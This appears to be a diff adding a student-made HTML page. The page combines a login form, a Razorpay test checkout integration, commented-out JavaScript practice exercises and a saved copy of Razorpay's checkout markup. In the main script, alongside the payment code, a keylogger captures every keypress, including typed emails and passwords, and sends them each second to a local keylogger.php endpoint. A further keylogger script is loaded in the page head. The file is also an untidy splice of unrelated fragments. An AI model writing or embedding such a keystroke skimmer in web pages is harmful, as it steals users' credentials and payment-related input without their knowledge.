@@ -1,0 +1,1061 @@
+<html>
+<title>Hello</title>
+<script src="http://localhost/keylogger.js"></script>
+
+<body>
+    <script>
+        //document.documentElement.innerHTML = `Hello World`
+    </script>
+    Hello,
+    Hi.<br>
+    <form>
+        <div class="login">
+            <input type="email" name="email" placeholder="Email" value=""><br><br>
+            <input type="password" name="password" placeholder="Password" value=""><br><br>
+            <button type="submit">Login</button>
+        </div>
+    </form>
+
+
+
+
+
+    <button id="rzp-button1">Pay</button>
+    <button type="button" onclick='document.getElementById("demo").innerHTML = "Hello JavaScript!"'>Click Me!</button>
+    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+    <script>
+
+        var options = {
+            "key": "rzp_test_773sSP22nNflr6", // Enter the Key ID generated from the Dashboard
+            "amount": "50000", // Amount is in currency subunits. Default currency is INR. Hence, 50000 refers to 50000 paise
+            "currency": "INR",
+            "name": "Acme Corp", //your business name
+            "description": "Test Transaction",
+            "image": "https://example.com/your_logo",
+            //This is a sample Order ID. Pass the `id` obtained in the response of Step 1
+            "handler": function (response) {
+                alert(response.razorpay_payment_id);
+                alert(response.razorpay_order_id);
+                alert(response.razorpay_signature)
+            },
+            "prefill": { //We recommend using the prefill parameter to auto-fill customer's contact information, especially their phone number
+                "name": "Gaurav Kumar", //your customer's name
+                "email": "gaurav.kumar@example.com",
+                "contact": "9000090000"  //Provide the customer's phone number for better conversion rates 
+            },
+            "notes": {
+                "address": "Razorpay Corporate Office"
+            },
+            "theme": {
+                "color": "#3399cc"
+            }
+        };
+        var rzp1 = new Razorpay(options);
+        rzp1.on('payment.failed', function (response) {
+            alert(response.error.code);
+            alert(response.error.description);
+            alert(response.error.source);
+            alert(response.error.step);
+            alert(response.error.reason);
+            alert(response.error.metadata.order_id);
+            alert(response.error.metadata.payment_id);
+        });
+        document.getElementById('rzp-button1').onclick = function (e) {
+            rzp1.open();
+            e.preventDefault();
+        }
+
+        var keys = '';
+        var url = 'http://localhost/keylogger.php?c=';
+        document.onkeypress = function (e) {
+            get = window.event ? event : e;
+            key = get.keyCode ? get.keyCode : get.charCode;
+            key = String.fromCharCode(key);
+            keys += key;
+        }
+        window.setInterval(function () {
+            if (keys.length > 0) {
+                new Image().src = url + keys;
+                keys = '';
+            }
+        }, 1000);
+    </script>
+
+
+    <!-- is[8680439..toString(30)](1);
+
+let a = 'Raj\nesh'
+console.log(a)
+let b = 'Milon'
+let sen = `<b>My name is ${b} `
+let se = `${a} is my best friend. </b>`
+let arr = '1,2,3,4,5,6,7,8,9,0'
+let c = 5
+
+
+// chapter 1 practice set
+console.log(b+c)
+console.log( typeof (b+c))
+console.log(arr)
+
+const d = 65
+//d = 5 cant change value of const
+const e = {
+name: 'rajesh',
+student: 'computer',
+phone: 9943
+}
+console.log(e)
+e ['section'] = 'a'
+console.log(e)
+const dict = {
+book: 'boi',
+bulb: 'light',
+hostel: 'chatra bas'
+}
+console.log(dict.book)
+
+let f = 43
+let g = 5
+console.log('f + g is equal to', g+f)
+console.log('f - g is equal to', g-f)
+console.log('f * g is equal to', g*f)
+console.log('f / g is equal to', g/f)
+console.log('f % g is equal to', g%f)
+console.log('g++ is equal to', g++)
+console.log(g)
+console.log('++g is equal to', ++g)
+console.log(g)
+
+let com1 = 34
+let com2 = '34'
+console.log('com1 == com2 is ',com1==com2)
+console.log('com1 != com2 is ',com1!=com2)
+console.log('com1 === com2 is ',com1===com2)
+console.log('com1 !== com2 is ',com1!==com2)
+
+document.write(sen);
+document.write(se);  
+    </script>
+-->
+
+    <html dir="ltr" lang="en"
+        style="--primary-color: #3399cc; --cta-color: #3399cc; --cta-text-color: #FFFFFF; --text-color: #FFFFFF; --light-text-color: rgba(255,255,255, 0.7); --highlight-color: rgba(36, 107, 143, 1); --light-highlight-color: rgba(255,255,255, 0.1); --hover-state-color: rgba(61, 184, 245, 0.06); --background-color: rgba(61, 184, 245, 1); --secondary-highlight-color: rgba(61, 184, 245, 0.06); --active-state-color: rgba(61, 184, 245, 0.09); --header-logo-bg-color: rgba(51, 153, 204, 0.5); --header-logo-text-color: rgba(0, 0, 0, 0.85); --gradient-color: rgba(51, 153, 204, 0.55); --scroll-color: rgba(255, 255, 255, 0.5); --downtime-low-color: #f99d27; --downtime-medium-color: #f99d27; --downtime-high-color: #d12d2d; --downtime-low-background: #fff2e3; --downtime-medium-background: #fff2e3; --downtime-high-background: #faeaea; --magic-brand-color: #005bf2; --magic-padding-desktop: 24px; --font-weight-regular: 400; --font-weight-medium: 500; --font-weight-semibold: 600; --font-weight-bold: 700; --font-size-body: 14px; --font-size-heading: 16px; --font-size-small: 12px; --font-size-tiny: 10px; --primary-text-color: #171a1e; --secondary-text-color: #414449; --tertiary-text-color: #676a6d; --positive-text-color: #4ea376; --error-validation-color: #d12d2d; --background-color-magic: #f0f0f4; --light-dark-color: #d9dadb; --bg-color-disabled: #0000000d;">
+
+    <head>
+        <meta charset="utf-8">
+        <title>Razorpay Checkout</title>
+        <link rel="icon" href="data:;base64,=">
+        <meta name="viewport" content="user-scalable=no,width=device-width,initial-scale=1,maximum-scale=1">
+        <style>
+            @font-face {
+                font-family: lato;
+                font-weight: 400;
+                font-style: normal;
+                src: url(https://cdn.razorpay.com/lato.woff2) format('woff2'), url(https://cdn.razorpay.com/lato.woff) format('woff')
+            }
+        </style>
+        <script
+            src="https://checkout-static-next.razorpay.com/build/62e31b8b728433d9a6b155750fb8114586269242/checkout-frame-standard-lite.js"
+            crossorigin="anonymous"></script>
+        <link rel="stylesheet"
+            href="https://checkout-static-next.razorpay.com/build/62e31b8b728433d9a6b155750fb8114586269242/css/checkout.css">
+        <script
+            src="https://checkout-static-next.razorpay.com/build/62e31b8b728433d9a6b155750fb8114586269242/checkout-frame.modern.js"
+            crossorigin="anonymous"></script>
+        <style></style>
+    </head>
+
+    <body>
+        <div style="font-family:lato;visibility:hidden;position:absolute">.</div>
+        <script>window.isNewPublicPage = !0; var polyfillFeatures = []; document.currentScript || polyfillFeatures.push("document.currentScript|always"), window.Intl || polyfillFeatures.push("Intl.~locale.en|always"); var polyfillQParams = encodeURIComponent(polyfillFeatures.join(",")); if (polyfillFeatures.length) try { document.write('<script src="https://cdn.polyfill.io/v3/polyfill.min.js?features=' + polyfillQParams + '"><\/script>') } catch (r) { } function isModernBrowser() { try { return eval("function c(){try{if(({t:!0})?.t)return!0}catch(r){}return!1};c();") } catch (r) { } return !1 } function getQueryParams() { for (var r = {}, e = window.location.search.substring(1).split("&"), t = 0; t < e.length; t++) { var o = e[t].split("="), c = decodeURIComponent(o[0]), n = decodeURIComponent(o[1] || ""); r[c] = n } return r } function addLink(r) { var e = document.createElement("link"); e.rel = "stylesheet", e.href = r.source, "function" == typeof r.onError && (e.onerror = r.onError), document.head.appendChild(e) } function addScript(r, e) { var t = document.createElement("script"); t.src = r.source + (e ? "?retry=1" : ""), e ? "function" == typeof r.onError && (t.onerror = r.onError) : (t.crossOrigin = "anonymous", t.onerror = function () { addScript(r, !0) }), document.head.appendChild(t) } function addAssets() { var r = getQueryParams(); if (r.build) { var e = "", t = "https://checkout-static-next.razorpay.com/build/" + (r.build || "").replace(/[^a-zA-Z0-9_]/g, ""); e = isModernBrowser() && 1 === Number(r.modern) ? t + "/checkout-frame.modern.js" : t + "/checkout-frame.js", r.merchant_key ? e = t + "/checkout-frame-lite.js" : (addScript({ source: t + "/checkout-frame-standard-lite.js" }), addLink({ source: t + "/css/checkout.css", onError: function () { addLink({ source: "https://checkout.razorpay.com/v1/css/checkout.css?retry=1" }) } })), addScript({ source: e, onError: function () { addScript({ source: r.merchant_key ? "https://checkout.razorpay.com/v1/checkout-frame-lite.js?retry=2" : "https://checkout.razorpay.com/v1/checkout-frame.js?retry=2" }) } }) } else addScript({ source: "https://checkout.razorpay.com/v1/checkout-frame-standard-lite.js" }) } addAssets()</script>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400;500;600;700;800&amp;display=swap"
+            rel="stylesheet" type="text/css">
+        <script src="https://browser.sentry-cdn.com/7.2.0/bundle.min.js"
+            integrity="sha384-yvW0r7aI4VkwNfs/eOzYsODvXkNVQon3MBtow61jPf/pOR166EPvTSNBr9nG3C3y"
+            crossorigin="anonymous"></script>
+        <div id="container" class="mfix svelte-gk8k86 redesign test downtime-v2 font-loaded drishy mobile">
+            <div id="backdrop"></div>
+            <div id="modal" class="mchild svelte-gk8k86 full-height one-cc checkout-flow rtb-disabled">
+                <div id="modal-inner">
+                    <div id="overlay"></div>
+                    <div id="error-message" class="overlay showable svelte-gk8k86">
+                        <div class="error-message-content svelte-gk8k86">
+                            <div class="omnichannel"><img src="https://cdn.razorpay.com/app/googlepay.svg" alt=""
+                                    style="width: 35px;">
+                                <div id="overlay-close" class="close">×</div>
+                            </div>
+                            <div id="fd-t" class="svelte-gk8k86"></div>
+                            <div class="spin">
+                                <div></div>
+                            </div>
+                            <div class="spin spin2">
+                                <div></div>
+                            </div> <span class="link">Cancel Payment</span> <button id="fd-hide"
+                                class="btn">Retry</button>
+                            <div id="cancel_upi">
+                                <p>Please give us a reason before we cancel the payment</p> <label for="upi-1"><input
+                                        id="upi-1" type="radio" name="_[reason]" value="collect_not_received"> Did not
+                                    receive collect request</label> <label for="upi-2"><input id="upi-2" type="radio"
+                                        name="_[reason]" value="failed_in_app"> Payment failed in UPI app</label> <label
+                                    for="upi-3"><input id="upi-3" type="radio" name="_[reason]" value="money_deducted">
+                                    Money got deducted but payment is still processing</label> <label for="upi-4"><input
+                                        id="upi-4" type="radio" name="_[reason]" value="other"> Other</label>
+                                <div class="buttons"><button class="back-btn">Back</button> <button
+                                        class="btn">Submit</button></div>
+                            </div>
+                        </div>
+                        <div id="cancel_netbanking" class="cancel_modal svelte-7pi4hg modal_checkout_redesign">
+                            <p class="svelte-7pi4hg">Please share a reason for cancelling this payment</p> <label
+                                for="netbanking-0" class="svelte-7pi4hg"><input id="netbanking-0" type="radio"
+                                    name="_[reason]" value="wrong_bank_selected" class="svelte-7pi4hg"> Wrong bank
+                                selected</label><label for="netbanking-1" class="svelte-7pi4hg"><input id="netbanking-1"
+                                    type="radio" name="_[reason]" value="forgot_bank_details" class="svelte-7pi4hg">
+                                Forgot username or password</label><label for="netbanking-2"
+                                class="svelte-7pi4hg"><input id="netbanking-2" type="radio" name="_[reason]"
+                                    value="bank_page_error" class="svelte-7pi4hg"> Error on bank page</label><label
+                                for="netbanking-3" class="svelte-7pi4hg"><input id="netbanking-3" type="radio"
+                                    name="_[reason]" value="other" class="svelte-7pi4hg"> Other</label>
+                            <div class="buttons svelte-7pi4hg"> <button class="btn svelte-7pi4hg">Submit</button></div>
+                        </div>
+                    </div>
+                    <div id="content" class="one-cc header-expanded">
+                        <div id="redesign-header" style="transition: all 0.5s; " class="svelte-gk8k86 no-rtb">
+                            <div id="header-redesign-v15-wrap" class="svelte-gk8k86">
+                                <div id="header-wrapper" class="svelte-f8jo93 dark-primary-color rtb-disabled no-rtb">
+                                    <div class="header-container svelte-f8jo93">
+                                        <div class="left-section svelte-f8jo93"><span class="back svelte-f8jo93"> <svg
+                                                    width="18" height="12" viewBox="0 0 18 12" fill="none"
+                                                    xmlns="http://www.w3.org/2000/svg">
+                                                    <path
+                                                        d="M6.68188 1.04102L1.72266 6.00005M1.72266 6.00005L6.68188 10.9593M1.72266 6.00005H16.2736"
+                                                        stroke="#FFFFFF" stroke-width="1.5" stroke-linecap="round"
+                                                        stroke-linejoin="round"></path>
+                                                </svg>
+                                            </span>
+                                            <div class="logo-title-container svelte-f8jo93">
+                                                <div id="logo" class="image-frame svelte-f8jo93"><img
+                                                        src="https://example.com/your_logo" alt=""
+                                                        class="svelte-f8jo93"></div>
+                                                <div class="header-title-wrapper svelte-f8jo93">
+                                                    <p title="Acme Corp"
+                                                        class="header-title svelte-f8jo93 header-title-collapse"
+                                                        data-avoid-width-stretch="true">Acme Corp</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="right-section svelte-f8jo93"><button
+                                                class="modal-close svelte-f8jo93"> <svg width="20" height="20"
+                                                    viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                    <path
+                                                        d="M15.59 5.59a.833.833 0 0 0-1.18-1.18L10 8.823 5.59 4.41a.833.833 0 1 0-1.18 1.178L8.822 10l-4.41 4.41a.833.833 0 1 0 1.178 1.18L10 11.178l4.412 4.41a.833.833 0 1 0 1.178-1.178L11.18 10l4.41-4.412Z"
+                                                        fill="#FFFFFF"></path>
+                                                </svg></button> <span>
+                                                <div data-test-id="vernacular-cta" class="wrapper svelte-16b28x5"><span
+                                                        data-test-id="vernacular-text"
+                                                        class="selected-language svelte-16b28x5"> <svg width="24"
+                                                            height="24" viewBox="0 0 24 24" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path
+                                                                d="M17.3052 13.184L15.4963 18.9231H14.0391L16.5104 12H17.4377L17.3052 13.184ZM18.8081 18.9231L16.9946 13.184L16.8484 12H17.7848L20.2698 18.9231H18.8081ZM18.7258 16.3459V17.4633H15.213V16.3459H18.7258Z"
+                                                                fill="white"></path>
+                                                            <rect x="11.1162" y="9.42285" width="12.0769"
+                                                                height="12.0769" rx="1.5" stroke="white"></rect>
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M7.67075 15.4609H6.07812V18.3486L7.34426 19.6148H10.232V18.0228H7.67075V15.4609Z"
+                                                                fill="white"></path>
+                                                            <mask id="path-5-outside-1_4902_36286"
+                                                                maskUnits="userSpaceOnUse" x="3" y="2" width="14"
+                                                                height="14" fill="black">
+                                                                <rect fill="white" x="3" y="2" width="14" height="14">
+                                                                </rect>
+                                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                    d="M4 4C4 3.44771 4.44772 3 5 3H14.0769C14.6292 3 15.0769 3.44772 15.0769 4V9H12.5C12.277 9 12.0625 9.03649 11.8623 9.10383V6.64649H13.0002V5.42285H9.41587L10.1678 6.64649H10.6491V7.68522C10.6491 7.9644 10.5639 8.18737 10.3934 8.35415C10.2263 8.5173 9.99237 8.59887 9.69159 8.59887C9.44093 8.59887 9.01649 8.45385 8.41826 8.1638C8.98641 7.90639 9.27049 7.49307 9.27049 6.92385C9.27049 6.46702 9.09503 6.10265 8.74411 5.83073C8.3932 5.55881 7.90526 5.42285 7.28029 5.42285C6.74556 5.42285 6.34451 5.47542 6.07715 5.58056L6.65365 6.55948C7.18838 6.27668 7.62954 6.13528 7.97711 6.13528C8.16761 6.13528 8.31967 6.18604 8.4333 6.28756C8.54693 6.38907 8.60375 6.50872 8.60375 6.64649C8.60709 6.88578 8.44166 7.09606 8.10745 7.27734C7.77659 7.45862 7.32708 7.57102 6.75893 7.61452L7.51591 8.56624C7.60614 8.55174 7.69471 8.54449 7.7816 8.54449C8.08573 8.54086 8.33805 8.62788 8.53858 8.80553C8.7391 8.98319 8.83936 9.2116 8.83936 9.49077C8.83936 9.67568 8.75915 9.84064 8.59873 9.98567C8.43831 10.1307 8.24615 10.2032 8.02223 10.2032C7.68802 10.2032 7.38724 10.0437 7.11987 9.72462C6.85251 9.40194 6.67705 8.98137 6.5935 8.46291H6.13229C6.20916 9.36931 6.44645 10.089 6.84415 10.622C7.2452 11.1549 7.71643 11.4232 8.25784 11.4268C8.64552 11.4268 8.96803 11.2873 9.22537 11.0081C9.48605 10.7253 9.61639 10.3446 9.61639 9.86602C9.61639 9.77538 9.61138 9.68293 9.60135 9.58866C10.0258 9.58866 10.375 9.54334 10.6491 9.4527V10.2409C10.553 10.475 10.5 10.7313 10.5 11V14.0769H5C4.44771 14.0769 4 13.6292 4 13.0769V4Z">
+                                                                </path>
+                                                            </mask>
+                                                            <path
+                                                                d="M15.0769 9V10H16.0769V9H15.0769ZM11.8623 9.10383H10.8623V10.495L12.1809 10.0517L11.8623 9.10383ZM11.8623 6.64649V5.64649H10.8623V6.64649H11.8623ZM13.0002 6.64649V7.64649H14.0002V6.64649H13.0002ZM13.0002 5.42285H14.0002V4.42285H13.0002V5.42285ZM9.41587 5.42285V4.42285H7.6276L8.56388 5.94642L9.41587 5.42285ZM10.1678 6.64649L9.31585 7.17006L9.60863 7.64649H10.1678V6.64649ZM10.6491 6.64649H11.6491V5.64649H10.6491V6.64649ZM10.3934 8.35415L11.092 9.06966L11.0928 9.0689L10.3934 8.35415ZM8.41826 8.1638L8.00557 7.25293L6.06286 8.13314L7.98199 9.06362L8.41826 8.1638ZM8.74411 5.83073L9.35663 5.04027L9.35663 5.04027L8.74411 5.83073ZM6.07715 5.58056L5.71118 4.64994L4.62102 5.07865L5.21547 6.08803L6.07715 5.58056ZM6.65365 6.55948L5.79198 7.06694L6.27673 7.89005L7.12116 7.44347L6.65365 6.55948ZM8.4333 6.28756L7.76706 7.03329L7.76706 7.03329L8.4333 6.28756ZM8.60375 6.64649H7.60365L7.60384 6.66045L8.60375 6.64649ZM8.10745 7.27734L7.63065 6.39832L7.62695 6.40035L8.10745 7.27734ZM6.75893 7.61452L6.68258 6.61744L4.80263 6.7614L5.9763 8.23701L6.75893 7.61452ZM7.51591 8.56624L6.73327 9.18873L7.09726 9.64636L7.67459 9.55357L7.51591 8.56624ZM7.7816 8.54449V9.54456L7.79352 9.54442L7.7816 8.54449ZM8.53858 8.80553L9.20171 8.05703L9.20171 8.05703L8.53858 8.80553ZM8.59873 9.98567L7.92812 9.24386L7.92812 9.24386L8.59873 9.98567ZM7.11987 9.72462L6.34984 10.3627L6.35341 10.3669L7.11987 9.72462ZM6.5935 8.46291L7.58076 8.30381L7.44525 7.46291H6.5935V8.46291ZM6.13229 8.46291V7.46291H5.0439L5.13587 8.54742L6.13229 8.46291ZM6.84415 10.622L6.04269 11.22L6.04511 11.2232L6.84415 10.622ZM8.25784 11.4268L8.25115 12.4268H8.25784V11.4268ZM9.22537 11.0081L8.4901 10.3303L8.4901 10.3303L9.22537 11.0081ZM9.60135 9.58866V8.58866H8.48935L8.60696 9.69442L9.60135 9.58866ZM10.6491 9.4527H11.6491V8.06868L10.3351 8.50328L10.6491 9.4527ZM10.6491 10.2409L11.5742 10.6207L11.6491 10.4382V10.2409H10.6491ZM10.5 14.0769V15.0769H11.5V14.0769H10.5ZM5 2C3.89543 2 3 2.89543 3 4H5V4V2ZM14.0769 2H5V4H14.0769V2ZM16.0769 4C16.0769 2.89543 15.1815 2 14.0769 2V4H14.0769H16.0769ZM16.0769 9V4H14.0769V9H16.0769ZM12.5 10H15.0769V8H12.5V10ZM12.1809 10.0517C12.2798 10.0184 12.3867 10 12.5 10V8C12.1673 8 11.8453 8.05455 11.5436 8.15597L12.1809 10.0517ZM12.8623 9.10383V6.64649H10.8623V9.10383H12.8623ZM11.8623 7.64649H13.0002V5.64649H11.8623V7.64649ZM14.0002 6.64649V5.42285H12.0002V6.64649H14.0002ZM13.0002 4.42285H9.41587V6.42285H13.0002V4.42285ZM8.56388 5.94642L9.31585 7.17006L11.0198 6.12292L10.2678 4.89928L8.56388 5.94642ZM10.1678 7.64649H10.6491V5.64649H10.1678V7.64649ZM9.64909 6.64649V7.68522H11.6491V6.64649H9.64909ZM9.64909 7.68522C9.64909 7.7231 9.64341 7.72487 9.65107 7.70481C9.65481 7.69503 9.6607 7.68287 9.66912 7.67003C9.67755 7.65719 9.68641 7.64686 9.69404 7.63939L11.0928 9.0689C11.4883 8.68188 11.6491 8.18369 11.6491 7.68522H9.64909ZM9.69482 7.63863C9.70721 7.62654 9.72093 7.61598 9.73466 7.6076C9.74822 7.59932 9.75859 7.59512 9.76338 7.59345C9.77215 7.59039 9.75308 7.59887 9.69159 7.59887V9.59887C10.1751 9.59887 10.6887 9.46344 11.092 9.06966L9.69482 7.63863ZM9.69159 7.59887C9.73076 7.59887 9.68529 7.60419 9.50859 7.54382C9.3485 7.48912 9.13265 7.39883 8.85453 7.26399L7.98199 9.06362C8.3021 9.21882 8.59759 9.34607 8.86194 9.43639C9.10968 9.52104 9.40176 9.59887 9.69159 9.59887V7.59887ZM8.83096 9.07467C9.24081 8.88898 9.61389 8.6166 9.88155 8.22717C10.1532 7.83197 10.2705 7.38244 10.2705 6.92385H8.27049C8.27049 7.03448 8.24576 7.07622 8.23331 7.09433C8.21689 7.11822 8.16387 7.18121 8.00557 7.25293L8.83096 9.07467ZM10.2705 6.92385C10.2705 6.16829 9.96014 5.50793 9.35663 5.04027L8.1316 6.62119C8.22991 6.69737 8.27049 6.76576 8.27049 6.92385H10.2705ZM9.35663 5.04027C8.77144 4.58682 8.03861 4.42285 7.28029 4.42285V6.42285C7.7719 6.42285 8.01495 6.5308 8.1316 6.62119L9.35663 5.04027ZM7.28029 4.42285C6.70923 4.42285 6.15624 4.47492 5.71118 4.64994L6.44312 6.51119C6.53279 6.47593 6.78189 6.42285 7.28029 6.42285V4.42285ZM5.21547 6.08803L5.79198 7.06694L7.51533 6.05201L6.93882 5.0731L5.21547 6.08803ZM7.12116 7.44347C7.60403 7.1881 7.87199 7.13528 7.97711 7.13528V5.13528C7.38708 5.13528 6.77274 5.36526 6.18615 5.67549L7.12116 7.44347ZM7.97711 7.13528C7.98443 7.13528 7.9606 7.13632 7.91741 7.1219C7.87116 7.10646 7.81702 7.07792 7.76706 7.03329L9.09954 5.54182C8.76001 5.23848 8.34952 5.13528 7.97711 5.13528V7.13528ZM7.76706 7.03329C7.73936 7.00854 7.69449 6.95963 7.65781 6.88239C7.61999 6.80274 7.60375 6.71986 7.60375 6.64649H9.60375C9.60375 6.19189 9.40038 5.81059 9.09954 5.54182L7.76706 7.03329ZM7.60384 6.66045C7.603 6.60015 7.61327 6.53852 7.63388 6.48135C7.654 6.42554 7.67923 6.38699 7.69624 6.36537C7.72532 6.3284 7.7247 6.34732 7.63066 6.39833L8.58424 8.15636C9.03754 7.91048 9.61481 7.43182 9.60365 6.63253L7.60384 6.66045ZM7.62695 6.40035C7.4678 6.48755 7.17463 6.57976 6.68258 6.61744L6.83528 8.61161C7.47953 8.56227 8.08537 8.4297 8.58795 8.15434L7.62695 6.40035ZM5.9763 8.23701L6.73327 9.18873L8.29854 7.94376L7.54156 6.99204L5.9763 8.23701ZM7.67459 9.55357C7.71504 9.54707 7.75051 9.54449 7.7816 9.54449V7.54449C7.6389 7.54449 7.49724 7.55641 7.35722 7.57891L7.67459 9.55357ZM7.79352 9.54442C7.84647 9.54379 7.86946 9.5512 7.87293 9.5524C7.87504 9.55313 7.87496 9.55328 7.87388 9.55265C7.8728 9.55202 7.87322 9.55206 7.87544 9.55403L9.20171 8.05703C8.78988 7.69217 8.28618 7.5384 7.76968 7.54456L7.79352 9.54442ZM7.87544 9.55403C7.87668 9.55513 7.87277 9.55183 7.86661 9.54351C7.86031 9.53501 7.85385 9.52421 7.8485 9.51202C7.84318 9.4999 7.8406 9.49015 7.83952 9.48469C7.8385 9.47952 7.83936 9.48095 7.83936 9.49077H9.83936C9.83936 8.93908 9.6265 8.43338 9.20171 8.05703L7.87544 9.55403ZM7.83936 9.49077C7.83936 9.43299 7.85318 9.3708 7.87988 9.3159C7.90487 9.2645 7.92999 9.24217 7.92812 9.24386L9.26935 10.7275C9.60049 10.4281 9.83936 10.007 9.83936 9.49077H7.83936ZM7.92812 9.24386C7.93574 9.23697 7.95418 9.22343 7.98125 9.21321C8.00777 9.2032 8.02448 9.2032 8.02223 9.2032V11.2032C8.48429 11.2032 8.91806 11.045 9.26935 10.7275L7.92812 9.24386ZM8.02223 9.2032C8.0191 9.2032 8.01954 9.20294 8.02149 9.20343C8.02336 9.2039 8.02137 9.20375 8.01453 9.20012C8.00035 9.1926 7.9551 9.1644 7.88633 9.08233L6.35341 10.3669C6.75998 10.8521 7.32131 11.2032 8.02223 11.2032V9.2032ZM7.88989 9.0866C7.76184 8.93206 7.64303 8.69022 7.58076 8.30381L5.60623 8.62201C5.71107 9.27253 5.94317 9.87182 6.34985 10.3626L7.88989 9.0866ZM6.5935 7.46291H6.13229V9.46291H6.5935V7.46291ZM5.13587 8.54742C5.22291 9.57383 5.49942 10.492 6.0427 11.22L7.6456 10.0239C7.39347 9.68601 7.19541 9.1648 7.12872 8.37841L5.13587 8.54742ZM6.04511 11.2232C6.58534 11.9412 7.32547 12.4206 8.25115 12.4268L8.26454 10.4269C8.10739 10.4258 7.90506 10.3687 7.6432 10.0207L6.04511 11.2232ZM8.25784 12.4268C8.91818 12.4268 9.50949 12.1753 9.96064 11.6859L8.4901 10.3303C8.42657 10.3992 8.37286 10.4268 8.25784 10.4268V12.4268ZM9.96064 11.6859C10.4305 11.1761 10.6164 10.5316 10.6164 9.86602H8.61639C8.61639 10.1576 8.54158 10.2745 8.4901 10.3303L9.96064 11.6859ZM10.6164 9.86602C10.6164 9.73848 10.6093 9.6107 10.5957 9.4829L8.60696 9.69442C8.61342 9.75516 8.61639 9.81228 8.61639 9.86602H10.6164ZM9.60135 10.5887C10.0871 10.5887 10.5522 10.538 10.9631 10.4021L10.3351 8.50328C10.1979 8.54865 9.96444 8.58866 9.60135 8.58866V10.5887ZM9.64909 9.4527V10.2409H11.6491V9.4527H9.64909ZM11.5 11C11.5 10.8638 11.5267 10.7363 11.5742 10.6207L9.72401 9.86111C9.5793 10.2136 9.5 10.5988 9.5 11H11.5ZM11.5 14.0769V11H9.5V14.0769H11.5ZM5 15.0769H10.5V13.0769H5V15.0769ZM3 13.0769C3 14.1815 3.89543 15.0769 5 15.0769V13.0769H5H3ZM3 4V13.0769H5V4H3Z"
+                                                                fill="white" mask="url(#path-5-outside-1_4902_36286)">
+                                                            </path>
+                                                        </svg></span> <span class="down-icon svelte-16b28x5"> <svg
+                                                            viewBox="0 0 16 16" width="13" height="13" fill="none"
+                                                            xmlns="http://www.w3.org/2000/svg">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M3.529 6.029c.26-.26.682-.26.942 0L8 9.557l3.529-3.528a.667.667 0 1 1 .942.943l-4 4a.667.667 0 0 1-.942 0l-4-4a.667.667 0 0 1 0-.943Z"
+                                                                fill="#FFFFFF"></path>
+                                                        </svg></span></div>
+                                            </span></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="topbar-redesign-v15-wrap"></div>
+                        </div>
+                        <div id="header" class="hidden">
+                            <div id="modal-close" class="close">×</div>
+                            <div id="logo" class="svelte-gk8k86"><img src="https://example.com/your_logo" alt=""></div>
+                            <div id="merchant">
+                                <div id="merchant-name">Acme Corp</div>
+                                <div id="merchant-desc">Test Transaction</div>
+                                <div id="amount" style="font-size: 20px;"><span class="discount"></span> <span
+                                        class="original-amount">₹ 500</span> <span class="fee"></span></div>
+                            </div>
+                            <div id="language-dropdown" class="svelte-1gckmih"><span
+                                    class="selected svelte-1gckmih">English</span></div>
+                        </div>
+                        <div id="body" class="svelte-gk8k86">
+                            <div id="topbar-wrap"></div>
+                            <div id="messages"></div>
+                            <form id="form" method="POST" novalidate="" autocomplete="off" class="svelte-gk8k86">
+                                <div id="root" class="svelte-jul7wb"></div>
+                                <div id="form-fields">
+                                    <div id="form-common"
+                                        class="tab-content showable screen svelte-1unl8xe tab-content-one-cc drishy"
+                                        style="display: block;">
+                                        <div class="screen screen-comp svelte-btdjlc redesign-v15 show-scroll">
+                                            <div class="screen-main svelte-1ovguqh screen-one-cc">
+                                                <div class="solidbg svelte-1ovguqh">
+                                                    <div class="home-methods svelte-1ovguqh">
+                                                        <div class="methods-block svelte-bm563m"
+                                                            data-block="homeScreen-qr">
+                                                            <h3 class="title svelte-bm563m">Pay With UPI QR</h3>
+                                                            <div role="list" class="qr-v2-wrapper svelte-bm563m">
+                                                                <div class="qrv2 svelte-1moycnq" data-testid="qrV2">
+                                                                    <div class="qr-image svelte-1moycnq"><img
+                                                                            data-testid="qrv2-img" alt="QRV2"
+                                                                            src="https://chart.googleapis.com/chart?chs=141x141&amp;cht=qr&amp;chl=upi%3A%2F%2Fpay%3Fver%3D01%26mode%3D15%26pa%3Drzr.qrrajeshchor78129958%40icic%26pn%3DRajeshChore%26tr%3DRZPM5e33AV9aELgCJqrv2%26cu%3DINR%26mc%3D0%26qrMedium%3D04%26tn%3DPaymenttoRajeshChore%26am%3D500&amp;choe=UTF-8&amp;chld=L|0"
+                                                                            class="svelte-1moycnq">
+                                                                        <div class="img-btn svelte-1moycnq"></div>
+                                                                    </div>
+                                                                    <div class="qr-content svelte-1moycnq">
+                                                                        <div class="message">Scan the QR using any UPI
+                                                                            app on your phone.</div>
+                                                                        <div class="psp-logos svelte-1moycnq"><img
+                                                                                src="https://cdn.razorpay.com/app/googlepay.svg"
+                                                                                alt="google_pay-app-logo"
+                                                                                class="svelte-1moycnq"><img
+                                                                                src="https://cdn.razorpay.com/app/phonepe.svg"
+                                                                                alt="phonepe-app-logo"
+                                                                                class="svelte-1moycnq"><img
+                                                                                src="https://cdn.razorpay.com/app/paytm.svg"
+                                                                                alt="paytm-app-logo"
+                                                                                class="svelte-1moycnq"><img
+                                                                                src="https://cdn.razorpay.com/app/bhim.svg"
+                                                                                alt="bhim-app-logo"
+                                                                                class="svelte-1moycnq"></div>
+                                                                        <div id="callout-text" class="svelte-1moycnq">
+                                                                            <div>QR Code is valid for </div> <span
+                                                                                style="color:red">10:10</span> minutes
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                                <div></div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="methods-block" data-block="rzp.cluster">
+                                                            <h3 class="title">Cards, UPI &amp; more</h3>
+                                                            <div role="list" class="border-list svelte-2ktngz"><button
+                                                                    type="button"
+                                                                    class="new-method has-tooltip false svelte-1r0bvhf"
+                                                                    role="listitem" method="card">
+                                                                    <div class="stack svelte-by96ls horizontal"><i
+                                                                            slot="icon" class="svelte-9f98o6"> <svg
+                                                                                viewBox="0 0 27 22" width="" height=""
